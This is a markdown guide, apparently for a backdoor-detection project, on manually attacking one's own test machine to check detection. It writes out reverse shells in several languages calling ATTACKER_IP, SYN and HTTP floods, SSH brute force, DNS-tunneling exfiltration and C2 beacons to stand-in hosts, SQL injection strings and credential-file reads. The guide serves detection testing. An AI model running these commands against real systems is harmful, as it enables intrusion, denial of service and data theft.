# Manual Attack Testing Guide

This guide shows you how to **manually perform attacks** to test your backdoor detection system, rather than using the automated attack simulator.

---

## ⚠️ **CRITICAL WARNINGS**

### **Legal & Ethical**
- ❌ **NEVER** attack systems you don't own
- ❌ **NEVER** attack without written authorization
- ✅ **ONLY** test on:
  - Your own systems
  - Isolated test environments
  - Virtual machines you control
  - Localhost (127.0.0.1)

### **Safety First**
- Use isolated networks or VMs
- Disconnect from production networks
- Have backups ready
- Know how to stop/reverse attacks

---

## 🎯 **Testing Setup**

### **Recommended Test Environment**

```
┌─────────────────────────────────────────┐
│         Your Testing Setup              │
│                                         │
│  ┌──────────────┐    ┌──────────────┐  │
│  │   Attacker   │───▶│   Target     │  │
│  │   Machine    │    │   Machine    │  │
│  │              │    │              │  │
│  │ (Your PC)    │    │ (VM/Docker)  │  │
│  └──────────────┘    └──────────────┘  │
│                                         │
│         Backdoor Detection              │
│         Monitoring Both                 │
└─────────────────────────────────────────┘
```

### **Option 1: Single Machine (Localhost)**
```bash
# Test against yourself (safest)
TARGET_IP=127.0.0.1
```

### **Option 2: Virtual Machine**
```bash
# Create a VM for testing
# Install VirtualBox/VMware
# Create Ubuntu VM
# Get VM IP: ip addr show
TARGET_IP=192.168.56.101  # Your VM IP
```

### **Option 3: Docker Container**
```bash
# Create a test container
docker run -d --name test-target -p 80:80 -p 22:22 ubuntu:latest
TARGET_IP=$(docker inspect -f '{{range .NetworkSettings.Networks}}{{.IPAddress}}{{end}}' test-target)
```

---

## 🔧 **Install Attack Tools**

```bash
# Update package list
sudo apt update

# Network scanning
sudo apt install -y nmap

# Network stress testing
sudo apt install -y hping3

# Network utilities
sudo apt install -y netcat ncat

# SSH brute force (for testing only!)
sudo apt install -y hydra

# DNS tools
sudo apt install -y dnsutils

# Web testing
sudo apt install -y curl wget

# Metasploit (advanced)
# sudo apt install -y metasploit-framework
```

---

## 🎯 **Manual Attack Scenarios**

### **1. Port Scanning Attack**

#### **What it is:**
Scanning a target to discover open ports and services.

#### **Why it's detected:**
- Unusual number of connection attempts
- Sequential port probing
- Rapid connection/disconnection patterns

#### **How to perform:**

```bash
# Set target
TARGET_IP=127.0.0.1  # Change to your target

# Basic scan (most common ports)
nmap $TARGET_IP

# Aggressive scan (all ports)
nmap -p- $TARGET_IP

# Stealth SYN scan (requires root)
sudo nmap -sS $TARGET_IP

# Service version detection
nmap -sV $TARGET_IP

# OS detection
sudo nmap -O $TARGET_IP

# Fast scan (top 100 ports)
nmap -F $TARGET_IP

# Verbose output
nmap -v $TARGET_IP
```

#### **Watch the dashboard:**
- Suricata should detect port scan patterns
- ANN should flag unusual connection patterns
- Hybrid engine should correlate multiple signals

---

### **2. SYN Flood Attack**

#### **What it is:**
Overwhelming a target with SYN packets to exhaust resources.

#### **Why it's detected:**
- High volume of SYN packets
- No ACK responses
- Resource exhaustion patterns

#### **How to perform:**

```bash
TARGET_IP=127.0.0.1
TARGET_PORT=80

# Basic SYN flood (10 seconds)
sudo hping3 -S -p $TARGET_PORT --flood --rand-source $TARGET_IP &
FLOOD_PID=$!
sleep 10
sudo kill $FLOOD_PID

# Controlled rate (1000 packets/sec)
sudo hping3 -S -p $TARGET_PORT --faster $TARGET_IP -c 1000

# Multiple ports
for port in 80 443 22 3306; do
    sudo hping3 -S -p $port $TARGET_IP -c 100 &
done
wait
```

#### **Stop the attack:**
```bash
# Kill all hping3 processes
sudo killall hping3
```

---

### **3. Reverse Shell Attack**

#### **What it is:**
Establishing a backdoor connection from target to attacker.

#### **Why it's detected:**
- Outbound connection to unusual port
- Shell process with network connection
- Suspicious process behavior

#### **How to perform:**

**Step 1: Start listener on attacker machine**
```bash
# Terminal 1 (Attacker - your machine)
nc -lvp 4444
```

**Step 2: Execute reverse shell on target**
```bash
# Terminal 2 (Target machine)
# Bash reverse shell
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1

# OR Python reverse shell
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# OR Netcat reverse shell
nc ATTACKER_IP 4444 -e /bin/bash

# OR Perl reverse shell
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

**Replace `ATTACKER_IP` with:**
- `127.0.0.1` if testing on same machine
- Your actual IP if using separate machines

#### **Watch for:**
- Host-based detection: Suspicious process (bash/python with network)
- Network detection: Outbound connection to port 4444
- Hybrid engine: High confidence malicious score

---

### **4. SSH Brute Force Attack**

#### **What it is:**
Attempting to guess SSH passwords through repeated login attempts.

#### **Why it's detected:**
- Multiple failed authentication attempts
- Rapid connection patterns
- Known attack signatures

#### **How to perform:**

**Step 1: Create a password list**
```bash
# Create a small wordlist
cat > passwords.txt << EOF
password
123456
admin
root
test
letmein
EOF
```

**Step 2: Run brute force**
```bash
TARGET_IP=127.0.0.1
USERNAME=testuser

# Using hydra
hydra -l $USERNAME -P passwords.txt ssh://$TARGET_IP

# Using nmap script
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=passwords.txt $TARGET_IP
```

#### **Watch for:**
- Suricata: SSH brute force alerts
- Multiple failed login attempts in system logs

---

### **5. DNS Tunneling Attack**

#### **What it is:**
Exfiltrating data through DNS queries to bypass firewalls.

#### **Why it's detected:**
- Unusual DNS query patterns
- Long subdomain names
- High frequency of queries
- Base64-encoded data in queries

#### **How to perform:**

```bash
# Simulate DNS tunneling with suspicious queries
DOMAIN="malicious-c2.com"

# Send encoded data via DNS
echo "secret_data" | base64 | while read line; do
    nslookup "$line.$DOMAIN"
    sleep 1
done

# Rapid DNS queries (tunneling pattern)
for i in {1..50}; do
    RANDOM_DATA=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 32)
    nslookup "$RANDOM_DATA.$DOMAIN"
done

# Long subdomain (data exfiltration)
LONG_SUBDOMAIN="aGVsbG93b3JsZHRoaXNpc2FzZWNyZXRtZXNzYWdl"
nslookup "$LONG_SUBDOMAIN.$DOMAIN"
```

---

### **6. HTTP Flood (DoS)**

#### **What it is:**
Overwhelming a web server with HTTP requests.

#### **Why it's detected:**
- High volume of requests
- Rapid connection rate
- Resource exhaustion

#### **How to perform:**

```bash
TARGET_URL="http://127.0.0.1"

# Simple flood with curl
for i in {1..1000}; do
    curl -s $TARGET_URL > /dev/null &
done
wait

# Using hping3
sudo hping3 -p 80 --flood $TARGET_IP

# Using Apache Bench (if installed)
ab -n 10000 -c 100 $TARGET_URL/

# Slowloris attack (slow HTTP)
# Keep connections open with incomplete requests
for i in {1..100}; do
    (echo -e "GET / HTTP/1.1\r\nHost: $TARGET_IP\r\n" | nc $TARGET_IP 80) &
done
```

---

### **7. SQL Injection (If you have a web app)**

#### **What it is:**
Injecting malicious SQL code through web inputs.

#### **How to perform:**

```bash
# Test for SQL injection
TARGET_URL="http://127.0.0.1/login.php"

# Basic injection tests
curl "$TARGET_URL?id=1' OR '1'='1"
curl "$TARGET_URL?id=1' UNION SELECT NULL--"
curl "$TARGET_URL?id=1'; DROP TABLE users--"

# Using sqlmap (automated)
sqlmap -u "$TARGET_URL?id=1" --batch --dbs
```

---

### **8. Malware Download Simulation**

#### **What it is:**
Simulating malware download patterns.

#### **How to perform:**

```bash
# Download from suspicious domains
wget http://malicious-domain.com/malware.exe
curl -O http://suspicious-site.com/backdoor.sh

# Download EICAR test file (safe malware test)
wget https://secure.eicar.org/eicar.com
```

---

### **9. Command & Control (C2) Communication**

#### **What it is:**
Simulating communication with a command & control server.

#### **How to perform:**

```bash
# Periodic beacons to external server
C2_SERVER="suspicious-c2.com"

# HTTP beacons
while true; do
    curl -s "http://$C2_SERVER/beacon?id=$(hostname)" > /dev/null
    sleep 60
done &

# DNS beacons
while true; do
    nslookup "beacon-$(date +%s).$C2_SERVER"
    sleep 60
done &
```

---

### **10. Privilege Escalation Simulation**

#### **What it is:**
Attempting to gain higher privileges.

#### **How to perform:**

```bash
# Try to access sensitive files
cat /etc/shadow
cat /etc/passwd

# Try to run commands as root
sudo su
sudo -l

# Search for SUID binaries
find / -perm -4000 2>/dev/null

# Check for writable system directories
find / -writable -type d 2>/dev/null
```

---

## 📊 **Monitoring Your Attacks**

### **Real-Time Monitoring**

**Terminal 1: Dashboard**
```bash
# Access the web dashboard
firefox http://localhost:7000
```

**Terminal 2: Watch Detection Logs**
```bash
# Watch all detections
tail -f /var/log/backdoor-detection/hybrid_live.log

# Watch only MALICIOUS detections
tail -f /var/log/backdoor-detection/hybrid_live.log | grep MALICIOUS

# Watch ANN detections
tail -f /var/log/backdoor-detection/ann_live.log

# Watch Suricata alerts
sudo tail -f /var/log/suricata/eve.json | grep alert
```

**Terminal 3: System Monitoring**
```bash
# Monitor network connections
watch -n 1 'netstat -an | grep ESTABLISHED'

# Monitor processes
watch -n 1 'ps aux | grep -E "(nc|bash|python)" | grep -v grep'

# Monitor CPU/Memory
htop
```

---

## 📝 **Attack Testing Workflow**

### **Step-by-Step Process**

1. **Prepare Environment**
   ```bash
   # Start your detection system
   sudo python3 app.py
   
   # Open dashboard
   firefox http://localhost:7000
   
   # Start monitoring logs
   tail -f /var/log/backdoor-detection/hybrid_live.log
   ```

2. **Perform Attack**
   ```bash
   # Choose an attack from above
   # Example: Port scan
   nmap -p- 127.0.0.1
   ```

3. **Observe Detection**
   - Check dashboard for alerts
   - Watch log files for detections
   - Note the detection time and confidence score

4. **Record Results**
   ```bash
   # Create attack log
   cat >> manual_attack_log.txt << EOF
   Timestamp: $(date)
   Attack Type: Port Scan
   Command: nmap -p- 127.0.0.1
   Detected: Yes/No
   Detection Time: X seconds
   Confidence Score: 0.XX
   Notes: ...
   EOF
   ```

5. **Analyze**
   - Was the attack detected?
   - How long did detection take?
   - What was the confidence score?
   - Any false positives?

---

## 🎯 **Attack Scenarios by Difficulty**

### **Beginner** (Easy to perform and detect)
1. ✅ Port scanning with nmap
2. ✅ Simple reverse shell
3. ✅ HTTP flood with curl

### **Intermediate** (Moderate complexity)
1. ✅ SSH brute force
2. ✅ DNS tunneling
3. ✅ SYN flood

### **Advanced** (Harder to detect)
1. ✅ Slow HTTP attacks
2. ✅ Encrypted C2 communication
3. ✅ Polymorphic malware simulation

---

## 📊 **Measuring Detection Success**

### **Create a Test Matrix**

| Attack Type | Command | Expected Detection | Actual Detection | Score | Notes |
|-------------|---------|-------------------|------------------|-------|-------|
| Port Scan | `nmap -p- 127.0.0.1` | Yes | ? | ? | |
| Reverse Shell | `nc -e /bin/bash` | Yes | ? | ? | |
| SYN Flood | `hping3 --flood` | Yes | ? | ? | |
| SSH Brute | `hydra ssh://...` | Yes | ? | ? | |
| DNS Tunnel | `nslookup ...` | Yes | ? | ? | |

### **Fill in as you test:**
```bash
# After each attack, record:
# 1. Was it detected? (Yes/No)
# 2. Detection score (0.0-1.0)
# 3. Time to detection (seconds)
# 4. Any false positives?
```

---

## 🛡️ **Safety & Cleanup**

### **Stop All Attacks**
```bash
# Kill all attack processes
sudo killall nmap hping3 nc hydra

# Kill background jobs
jobs -l
kill %1 %2 %3  # Kill by job number

# Kill by process name
pkill -f "bash -i"
pkill -f "python.*socket"
```

### **Clean Up**
```bash
# Remove test files
rm -f passwords.txt users.txt manual_attack_log.txt

# Clear bash history (if needed)
history -c

# Restart services
sudo systemctl restart suricata
```

### **Restore System**
```bash
# If you modified firewall
sudo ufw reset

# If you changed system files
# Restore from backup

# Reboot if needed
sudo reboot
```

---

## 📚 **Learning Resources**

### **Attack Techniques**
- **MITRE ATT&CK**: https://attack.mitre.org/
- **OWASP Testing Guide**: https://owasp.org/www-project-web-security-testing-guide/
- **Metasploit Unleashed**: https://www.metasploit.com/unleashed/

### **Practice Platforms** (Legal & Safe)
- **HackTheBox**: https://www.hackthebox.eu/
- **TryHackMe**: https://tryhackme.com/
- **VulnHub**: https://www.vulnhub.com/
- **DVWA**: Damn Vulnerable Web Application

### **Tools Documentation**
- **Nmap**: https://nmap.org/book/man.html
- **Hping3**: http://www.hping.org/
- **Hydra**: https://github.com/vanhauser-thc/thc-hydra
- **Metasploit**: https://docs.metasploit.com/

---

## ✅ **Manual Testing Checklist**

Before you start:
- [ ] System is isolated or using localhost
- [ ] You have authorization to test
- [ ] Backups are ready
- [ ] Detection system is running
- [ ] Monitoring is active

During testing:
- [ ] Record each attack performed
- [ ] Note detection results
- [ ] Monitor system resources
- [ ] Watch for false positives

After testing:
- [ ] Stop all attack processes
- [ ] Clean up test files
- [ ] Analyze results
- [ ] Update detection thresholds if needed
- [ ] Document findings

---

## 🎓 **Next Steps**

1. **Start Simple**: Begin with port scanning
2. **Progress Gradually**: Move to more complex attacks
3. **Document Everything**: Keep detailed notes
4. **Tune System**: Adjust thresholds based on results
5. **Repeat**: Test regularly with different techniques

---

## ⚠️ **Final Reminder**

**ONLY perform these attacks on:**
- ✅ Your own systems
- ✅ Systems you have written permission to test
- ✅ Isolated test environments
- ✅ Virtual machines you control

**NEVER:**
- ❌ Attack production systems without authorization
- ❌ Attack systems you don't own
- ❌ Use these techniques maliciously

---

**Happy (ethical) hacking! 🎯**

For automated testing, use: `scripts/attack_simulator.py`  
For accuracy measurement, use: `scripts/measure_accuracy.py`
